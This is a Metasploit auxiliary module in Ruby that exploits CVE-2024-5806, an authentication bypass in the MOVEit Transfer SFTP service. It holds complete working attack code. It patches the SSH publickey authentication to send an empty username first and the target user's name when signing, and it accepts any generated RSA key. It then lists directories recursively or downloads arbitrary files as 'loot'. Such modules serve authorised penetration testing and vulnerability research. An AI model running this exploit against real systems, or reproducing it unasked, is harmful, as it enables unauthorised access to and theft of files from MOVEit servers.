##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'net/ssh/transport/session'
require 'net/sftp'
require 'openssl'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Progress MOVEit SFTP Authentication Bypass for Arbitrary File Read',
        'Description' => %q{
          This module exploits CVE-2024-5806, an authentication bypass vulnerability in the MOVEit Transfer SFTP service. The
          following version are affected:

          * MOVEit Transfer 2023.0.x (Fixed in 2023.0.11)
          * MOVEit Transfer 2023.1.x (Fixed in 2023.1.6)
          * MOVEit Transfer 2024.0.x (Fixed in 2024.0.2)

          The module can establish an authenticated SFTP session for a MOVEit Transfer user. The module allows for both listing
          the contents of a directory, and the reading of an arbitrary file.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7' # MSF Module & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2024-5806'],
          ['URL', 'https://attackerkb.com/topics/44EZLG2xgL/cve-2024-5806/rapid7-analysis'] # AttackerKB Rapid7 Analysis.
        ],
        'DisclosureDate' => '2024-06-25',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RHOST,
        Opt::RPORT(22),
        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),
        OptString.new('TARGETUSER', [true, 'A valid username to authenticate as.', nil]),
        OptString.new('TARGETFILE', [true, 'The full path of a target file or directory to read.', '/']),
        Opt::Proxies
      ]
    )
  end

  # This method will be used by net/ssh when creating a new TCP socket. We need this so the net/ssh library will
  # honor Metasploit's network pivots, and route a connection through the expected session if applicable.
  def open(host, port, _connection_options = nil)
    vprint_status("Creating Rex::Socket::Tcp to #{host}:#{port}...")
    Rex::Socket::Tcp.create(
      'PeerHost' => host,
      'PeerPort' => port,
      'Proxies' => datastore['Proxies'],
      'Context' => {
        'Msf' => framework,
        'MsfExploit' => self
      }
    )
  end

  def check
    # Our check method will establish an unauthenticated connection to the remote SFTP (which is an extension of SSH)
    # service and we pull out the servers version string.
    transport = ::Net::SSH::Transport::Session.new(
      datastore['RHOST'],
      {
        port: datastore['RPORT'],
        # Use self as a proxy for the net/ssh library, to allow us to use Metasploit's Rex sockets, which will honor pivots.
        proxy: self
      }
    )

    ident = transport.server_version.version

    # We test the SSH version string for a known value of MOVEit SFTP.
    return Msf::Exploit::CheckCode::Safe(ident) unless ident == 'SSH-2.0-MOVEit Transfer SFTP'

    # We cannot get a product version number, so the best we can do is return Detected.
    Msf::Exploit::CheckCode::Detected(ident)
  rescue ::Rex::ConnectionRefused
    Msf::Exploit::CheckCode::Unknown('Connection Refused')
  rescue ::Rex::HostUnreachable
    Msf::Exploit::CheckCode::Unknown('Host Unreachable')
  rescue ::Rex::ConnectionTimeout, ::Net::SSH::ConnectionTimeout
    Msf::Exploit::CheckCode::Unknown('Connection Timeout')
  end

  def run
    # We want to change the behaviour of the build_request method. So first we alias the original build_request
    # method, so we can restore it later, as other things in MSF may use Net::SSH, and will expect normal behaviour.
    ::Net::SSH::Authentication::Methods::Publickey.send(:alias_method, :orig_build_request, :build_request)

    # Define the new behaviour. We exploit CVE-2024-5806 by supplying an invalid username (like an empty string) upon
    # the initial publickey auth request, then when sending the signature response to the server, we provide the username
    # of the valid user account we want to authenticate as.
    ::Net::SSH::Authentication::Methods::Publickey.send(:define_method, :build_request) do |pub_key, username, next_service, alg, has_sig|
      orig_build_request(pub_key, has_sig ? username : '', next_service, alg, has_sig)
    end

    print_status("Authenticating as: #{datastore['TARGETUSER']}@#{datastore['RHOST']}:#{datastore['RPORT']}")

    # With ::Net::SSH::Authentication::Methods::Publickey monkey patched above, we can trigger the auth bypass and get
    # back a valid SFTP session which we can interact with.
    ::Net::SFTP.start(
      datastore['RHOST'],
      datastore['TARGETUSER'],
      {
        port: datastore['RPORT'],
        auth_methods: ['publickey'],
        # The vulnerability allows us to supply any well formed RSA key and it will be accepted. So we generate a new
        # key (in PEM format) every time we exploit the vulnerability.
        key_data: [OpenSSL::PKey::RSA.new(2048).to_pem],
        # Use self as a proxy for the net/ssh library, to allow us to use Metasploit's Rex sockets, which will honor pivots.
        proxy: self
      }
    ) do |sftp|
      if File.directory? datastore['TARGETFILE']
        print_status("Listing directory: #{datastore['TARGETFILE']}")

        sftp.dir.glob(datastore['TARGETFILE'], '**/*') do |entry|
          # When we print the entry, we want to print the full path for each entry, so that further use of this module
          # can set the TARGETFILE correctly to the full path of a target file. The longname will contain (along with
          # permission, sizes and timestamps) a file/dir name but no path information. As we are using glob to
          # recursively list the contents of all sub folders, we reconstitute the full path for every entry before
          # printing it.
          entry_full_path = File.join(datastore['TARGETFILE'], entry.name)

          print_line(entry.longname.gsub(File.basename(entry.name), entry_full_path))
        end
      else
        print_status("Downloading file: #{datastore['TARGETFILE']}")

        read_file(sftp, datastore['TARGETFILE'])
      end
    end
  rescue ::Net::SFTP::StatusException
    print_error('SFTP Status Exception.')
  rescue ::Net::SSH::AuthenticationFailed
    print_error('SFTP Authentication Failed. Is TARGETUSER a valid username?')
  rescue ::Rex::ConnectionRefused
    print_error('SFTP Connection Refused.')
  rescue ::Rex::HostUnreachable
    print_error('SFTP Host Unreachable.')
  rescue ::Rex::ConnectionTimeout, ::Net::SSH::ConnectionTimeout
    print_error('SFTP Connection Timeout.')
  ensure
    ::Net::SSH::Authentication::Methods::Publickey.send(:alias_method, :build_request, :orig_build_request)
  end

  def read_file(sftp, file_path)
    sftp.open!(file_path) do |open_response|
      unless open_response.ok?
        print_error('SFTP open failed. Is the TARGETFILE path correct?')
        break
      end

      file_size = sftp.fstat!(open_response[:handle]).size

      sftp.read!(open_response[:handle], 0, file_size) do |read_response|
        unless read_response.ok?
          print_error('SFTP read failed.')
          break
        end

        file_data = read_response[:data].to_s

        if datastore['STORE_LOOT']
          print_status('Storing the file data to loot...')

          store_loot(
            file_path,
            file_data.ascii_only? ? 'text/plain' : 'application/octet-stream',
            datastore['RHOST'],
            file_data,
            datastore['TARGETFILE'],
            'File read from Progress MOVEit SFTP server'
          )
        else
          print_line(file_data)
        end
      end
    ensure
      sftp.close!(open_response[:handle]) if open_response.ok?
    end
  end

end
